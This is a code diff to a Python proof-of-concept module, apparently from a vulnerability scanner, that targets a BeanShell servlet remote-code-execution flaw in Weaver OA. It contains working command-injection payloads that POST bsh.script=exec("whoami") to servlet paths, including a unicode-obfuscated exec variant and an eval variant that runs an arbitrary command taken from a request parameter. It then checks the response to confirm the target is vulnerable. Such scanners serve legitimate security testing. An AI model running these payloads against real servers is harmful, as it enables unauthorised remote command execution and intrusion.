@@ -64,39 +64,33 @@ class WeaverOAREC(BasePoc):
             'Content-Length': '578'
         }
 
-        Url_Payload1="/bsh.servlet.BshServlet"
-        Url_Payload2="/weaver/bsh.servlet.BshServlet"
-        Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
-        Url_Payload4="/oa/bsh.servlet.BshServlet"
+        #Url_Payload1="/bsh.servlet.BshServlet"
+        #Url_Payload2="/weaver/bsh.servlet.BshServlet"
+        #Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
+        #Url_Payload4="/oa/bsh.servlet.BshServlet"
+        Url_Payload5="/servlet/~ic/bsh.servlet.BshServlet"
 
-        Data_Payload1="""bsh.script=exec("whoami");&bsh.servlet.output=raw"""
-        Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
-        Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""
+        Data_Payload1="""bsh.script=exec("whoami");"""
+        #Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");"""
+        #Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&command=whoami"""
+
+        url = urljoin(target,Url_Payload5)
+        Data_Payload = Data_Payload1
         
-        exit_flag = "false"
+        location = ""
+        resp = req(url, 'post', headers=headers, data=Data_Payload, allow_redirects=False, timeout=5)
 
-        for Url_Payload in (Url_Payload1, Url_Payload2, Url_Payload3, Url_Payload4):
-            url = urljoin(target,Url_Payload)
-            for Data_Payload in (Data_Payload1, Data_Payload2, Data_Payload3):
-                location = ""
-                resp = req(url, 'post', headers=headers,data=Data_Payload, allow_redirects=False, timeout=5)
-                if resp is not None:
-                    location = resp.text
-                if (";</script>" not in location) & ("Login.jsp" not in location) & ("Error" not in location):
-                    self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
-                    self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
-                    self.scan_info['Ret']['VerifyInfo']['DATA'] = location
-                    if verbose:
-                        highlight('[+] Weaver OA Bsh RCE found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
-                        exit_flag = "true"
-                        break
-                else:
-                    if verbose:
-                        highlight('[+] Weaver OA Bsh RCE not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
-                        exit_flag = "true"
-                        break
-            if exit_flag:
-                break
+        if resp is not None:
+            location = resp.text
+        if ("BeanShell" in location) & ("Script" in location) & ("bsh.servlet.output" in location):
+            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
+            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
+            self.scan_info['Ret']['VerifyInfo']['DATA'] = location
+            if verbose:
+                highlight('[+] Weaver OA Bsh RCE found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
+        else:
+            if verbose:
+                highlight('[+] Weaver OA Bsh RCE not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
 
     def exploit(self, first=False):
         # 漏洞利用方法（mode=verify）
